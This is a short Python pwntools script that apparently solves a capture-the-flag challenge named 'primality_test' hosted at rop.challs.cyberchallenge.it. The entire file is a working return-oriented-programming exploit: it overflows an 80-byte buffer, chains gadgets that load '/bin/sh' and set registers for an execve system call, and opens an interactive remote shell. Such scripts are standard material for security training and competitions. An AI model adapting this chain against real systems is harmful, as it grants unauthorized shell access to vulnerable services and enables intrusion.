from pwn import *

exe = ELF('./primality_test')
# context.binarry = exe

r = remote('rop.challs.cyberchallenge.it', 9130)

# POP_EAX_INT                 = 0x08048606   #: pop eax; int 0x80;
# POP_EAX_INT_POP_EBX_POP_ECX = 0x08048606   # pop eax; int 0x80; pop ebx; pop ecx; ret;"
# POP_EDX_RET                 = 0x0804860c   #: pop edx; ret;
# BIN_SH                      = next(exe.search(b'/bin/sh'))

POP_EAX_INT = 0x08048606    # pop eax; int 0x80;
POP_EBX_ECX = 0x08048609    # pop ebx; pop ecx; ret;
POP_ECX = 0x0804860a        # pop ecx; ret;
POP_EDX = 0x0804860c        # pop edx; ret;
BIN_SH  = next(exe.search(b'/bin/sh\x00'))

chain = (
    b'a' * (80) +
    p32(POP_EBX_ECX) +
    p32(BIN_SH) +
    p32(0) +
    p32(POP_EDX) +
    p32(0) +
    p32(POP_EAX_INT) +
    p32(11)
    )

r = remote('rop.challs.cyberchallenge.it', 9130)

r.sendlineafter(b'Enter a number: ', chain)
r.clean()
r.interactive()